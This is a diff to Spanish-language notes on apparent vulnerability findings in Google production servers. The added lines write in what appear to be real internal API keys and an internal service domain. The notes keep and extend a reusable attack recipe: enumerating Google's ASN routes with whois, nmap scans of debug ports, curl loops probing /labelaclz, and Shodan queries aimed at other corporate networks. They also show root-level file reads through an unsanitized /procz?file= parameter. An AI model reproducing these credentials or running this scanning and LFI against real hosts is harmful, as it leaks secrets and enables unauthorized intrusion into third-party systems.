@@ -744,7 +744,7 @@ http://108.177.0.8:9999/procz?file=/proc/self/maps
 **Puertos observados en hallazgos reales:**
 - `80` — 34.94.39.119, 35.227.157.158
 - `443` (HTTPS) — 34.120.121.40 (UPI payment gateway), 216.239.34.157 (chrome-proxy)
-- `7777` — 34.83.45.88 (DremelGateway)
+- `2222`, `7777` — 34.83.45.88 (DremelGateway)
 - `8080` — 34.75.135.42 (GOA server / Go Application framework)
 - `9999` — 108.177.0.8, 100.8.125.10 (Mobile Harness)
 - `443/springboard` — springboard.google.com (GWS prod)
@@ -796,7 +796,7 @@ ACLs:
 whois -h whois.radb.net -- '-i origin AS15169' | grep route | awk '{print $2}'
 
 # 2. Escanear puertos conocidos de debug internos (actualizado con todos los puertos reales)
-nmap -p 80,443,7777,8080,8888,9090,9999 --open <rango> -oG scan.txt
+nmap -p 80,443,2222,7777,8080,8888,9090,9999 --open <rango> -oG scan.txt
 
 # 3. Probar todos los endpoints de debug en cada IP activa
 for ip_port in $(cat scan.txt | grep "open" | awk '{print $2":"$NF}'); do
@@ -884,17 +884,19 @@ telnet 23.228.141.115 23
 ---
 
 ### 2. LFI en servidor Google prod — DremelGateway como ROOT con API keys expuestas
-**Target:** Google prod server 34.83.45.88:7777 (DremelGateway) | **Criticidad:** Muy crítica
+**Target:** Google prod server 34.83.45.88:7777, 34.83.45.88:2222 (DremelGateway) | **Criticidad:** Muy crítica
 
 **Endpoints vulnerables descubiertos:**
-- `/labelaclz` → confirma que el proceso corre como `root`
-- `/flagz` → expone todas las flags de configuración del servicio, incluyendo API keys
-- `/procz?file=/proc/self/cmdline` → **LFI** via parámetro `?file=` sin sanitizar — lee archivos arbitrarios del sistema como root
+- `/labelaclz` → confirma que el proceso corre como `root`. Info: `Owner Name: root`, `CDD file name: rpcacl_root_`.
+- `/flagz` → expone todas las flags de configuración del servicio, incluyendo API keys y dominios internos.
+- `/varz` → permite realizar un dump completo de las variables del servidor.
+- `/procz?file=/proc/self/cmdline` → **LFI** via parámetro `?file=` sin sanitizar — lee archivos arbitrarios del sistema como root.
 
 **API keys internas de Google expuestas via `/flagz`:**
-- `--dremel_api_key`
-- `--service_api_key`
-- `--dremel_cloud_bigtable_request_api_key`
+- `--dremel_api_key=AIzaSyAdMLkLUa1Xc184-BHZFYwZgJVUUYKsFNE`
+- `--service_api_key=AIzaSyCXPqYgq2pLwmm1gbP-zGbcb_7hXhDLVDM`
+- `--dremel_cloud_bigtable_request_api_key=AIzaSyC6bx_2nNWPebVTnHasmCB-DIN4Aptj74M`
+- `--logs_front_door_service=logs-front-door-prod.stubbyconfig.google.com`
 
 **Archivos legibles via LFI (`/procz?file=`):**
 ```
@@ -916,13 +918,13 @@ telnet 23.228.141.115 23
 ```
 
 **Técnica de descubrimiento:**
-- Escaneo de IPs en rangos ASN de Google en puertos no estándar (7777, 8080, 9090, etc.)
+- Escaneo de IPs en rangos ASN de Google en puertos no estándar (2222, 7777, 8080, 9090, etc.)
 - Los servicios internos de Google usan endpoints de debug estándar: `/flagz`, `/procz`, `/varz`, `/statusz`, `/labelaclz`
 - Estos endpoints exponen configuración interna cuando el servicio queda accesible públicamente
 
 **Targets ideales para técnicas similares:**
-- IPs de ASNs corporativos grandes en puertos no estándar (7777, 8888, 9999, etc.)
-- Buscar en Shodan: `org:"Google" port:7777`, `org:"Amazon" port:8080 /flagz`
+- IPs de ASNs corporativos grandes en puertos no estándar (2222, 7777, 8888, 9999, etc.)
+- Buscar en Shodan: `org:"Google" port:7777`, `port:2222`, `org:"Amazon" port:8080 /flagz`
 - Endpoints de diagnóstico internos expuestos: `/flagz`, `/varz`, `/statusz`, `/healthz`, `/debug`, `/admin`
 - Parámetro `?file=` en cualquier endpoint de monitoreo → probar LFI con `/proc/self/environ`
 
@@ -978,13 +980,13 @@ https://springboard.google.com/java/procz?file=/proc/net/netstat
 ### 3. LFI en servidor Google como ROOT — port 80 (mismo patrón, variante en puerto estándar)
 **Target:** Google prod server 34.94.39.119:80 | **Criticidad:** Muy crítica
 
-**Diferencias clave vs reporte anterior (34.83.45.88:7777):**
-- **Puerto 80** (HTTP estándar) en lugar de 7777 — confirma que estos servicios internos pueden quedar expuestos en cualquier puerto, incluyendo los estándar
+**Diferencias clave vs reporte anterior (34.83.45.88:7777/2222):**
+- **Puerto 80** (HTTP estándar) en lugar de 7777/2222 — confirma que estos servicios internos pueden quedar expuestos en cualquier puerto, incluyendo los estándar
 - **LabelACL Policy: OPEN** (vs `OWNER_ONLY` anterior) — política más permisiva, acceso sin restricciones
 - Sin `/flagz` reportado — pero mismo LFI via `/procz?file=` como root
 
 **Patrón confirmado en múltiples IPs (hallazgo sistemático en ASN Google):**
-- 34.83.45.88:7777 → DremelGateway, policy OWNER_ONLY, con /flagz y API keys internas
+- 34.83.45.88:7777, 2222 → DremelGateway, policy OWNER_ONLY, con /flagz y API keys internas
 - 34.94.39.119:80 → policy OPEN, puerto estándar
 - 35.227.157.158:80 → policy OPEN, misma configuración (CDD: Tue Jul 2 13:30:04 2019)
 
@@ -1000,7 +1002,7 @@ https://springboard.google.com/java/procz?file=/proc/net/netstat
   whois -h whois.radb.net -- '-i origin AS15169' | grep route
 
   # Escanear puertos comunes buscando /labelaclz
-  nmap -p 80,443,7777,8080,8443,9090 <rango> --open -oG output.txt
+  nmap -p 80,443,2222,7777,8080,8443,9090 <rango> --open -oG output.txt
 
   # Verificar endpoint en cada IP activa
   for ip in $(cat ips.txt); do curl -s "http://$ip/labelaclz" | grep "Owner Name" && echo $ip; done
